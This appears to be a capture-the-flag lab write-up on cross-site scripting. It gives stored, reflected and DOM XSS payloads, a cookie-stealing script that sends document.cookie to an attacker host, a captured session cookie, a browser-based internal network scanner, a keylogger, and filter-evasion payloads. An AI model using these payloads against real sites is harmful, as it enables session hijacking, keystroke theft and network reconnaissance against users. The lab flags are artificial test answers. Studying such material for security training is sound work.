> XSS

# Types of XSS

1. Stored
2. Reflected

# Stored XSS

Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.  

## Challenge 1: http://10.10.255.53/stored

We can add comments in this webpage. 

# Task 1: Add a comment and see if you can insert some of your own HTML.

*Payload*: `<!-- comment -->`

# Task 2: Create an alert popup box appear on the page with your document cookies.

*Payload*: `<script>alert(document.cookie)</alert>`

# Task 3: Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.

We can notice the Id of XSS Playgroung using Inspect element and in the console tab we can type 

`document.querySelector('#thm-title').textContent = 'I am a Hacker'`

Let's put the payload in comment box. 

*Payload*: `<script>document.getElementById('thm-title').innerHTML="I am a hacker";</script>`

```
websites_can_be_easily_defaced_with_xss
```

Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

`<script>window.location='http://attacker/?cookie='+document.cookie</script>`

This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 

# Task 4: Take over Jack's account by stealing his cookie, what was his cookie value?

From the hint or from Burp's sitemap we can find /log and accessing the page we are given a message 

`Anything that makes a request to /log/:text will be logged. For example, /log/anything+can+go+here will get logged to this page.`

So let's try a script to steal jack's cookie using `/log`.

*Payload*: `<script>document.location='http://10.10.119.143//log/'+document.cookie</script>`

And refreshing http://$IP/logs we get

```
5/7/2021, 9:29:42 AM : connect.sid s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
```

# Task 5: Post a comment as Jack.

Changing the value of the cookie in storage tab shows us we are in as jack. And after posting a comment we got the answer.

```
Successfully added a comment as Jack! Question answer: c00ki3_stealing_
```

# Reflected XSS

In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.

This might seem harmless as it requires the victim to send a request containing an attackers payload, and a user wouldn't attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email..

Reflected XSS is the most common type of XSS attack.

## Challenge 2

# Target URL: http://10.10.119.143/reflected?keyword=Term%20from%20URL...

# Task 1: Craft a reflected XSS payload that will cause a popup saying "Hello".

We can observe that whatever we search for is reflected in the source code as `You searched for <text>` and in the url.

*Payload*: `<script>alert("Hello")</script>`

# Task 2:Craft a reflected XSS payload that will cause a popup with your machines IP address.

*Payload*:  `<script>alert(window.location.hostname)</script>`

# DOM XSS

With DOM-Based xss, an attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with. It goes through a Javascript function like so:

```
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```

## Task 1: Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.

*Payload*: `test" onmouseover="alert('Hover over the image and inspect the image element')"`

And once we hover over the image area we got the popup.

*Final Payload* : `test" onmouseover="alert(document.cookie)"`

## Task 2: Create an onhover event on an image tag, that change the background color of the website to red.

*Final Payload* : `test" onmouseover="document.body.style.backgroundColor = 'red'`

# Using XSS for Ip and Port Scanning

On the application layer your browser has no notion of internal and external IP addresses. So any website is able to tell your browser to request a resource from your internal network.

For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

`<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">`

Please keep in mind this is a proof of concept and there are many factors that will effect results such as response times, firewall rules, cross origin policies and more. Our browsers can conduct a basic network scan and infer about existing IP's, hostnames and services. As this is a learning exercise assume the factors do not apply here.

The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255

```
<script>
 for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
 }
</script> 
```

## Reference

Detailed Port Scanner : https://github.com/aabeling/portscan

# Key-Logger with XSS

Javascript can be used for many things, including creating an event to listen for keypresses.

```
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```

# Filter Evasion

# Reports

1. https://hackerone.com/reports/415484 => XSS found in Shopify
2. https://hackerone.com/reports/409850 => $7,500 for XSS found in Steam chat
3. https://hackerone.com/reports/449351 => $2,500 for XSS in HackerOne
4. https://hackerone.com/reports/283825 => XSS found in Instagram

# Task 1: Bypass the filter that removes any script tags.

*Payload*: `<img src=x onerror=alert("Hello")>`

# Task 2: The word alert is filtered, bypass it. 

*Payload*: `<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))";>`

Didn't work.

*Final Payload*: `0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"`

# Task 3: The word hello is filtered, bypass it. 

*Payload* : `<object onerror=alert('Hello')>`

# Task 4: 
Filtered in challenge 4 is as follows:

1. word "Hello"
2. script
3. onerror
4. onsubmit
5. onload
6. onmouseover
7. onfocus
8. onmouseout
9. onkeypress
10. onchange

We can get payloads from here. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## POC

`<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>`

# Payload

`<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))"></xss>`

Worked but no flag.

`<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>`

And we got the flag!!!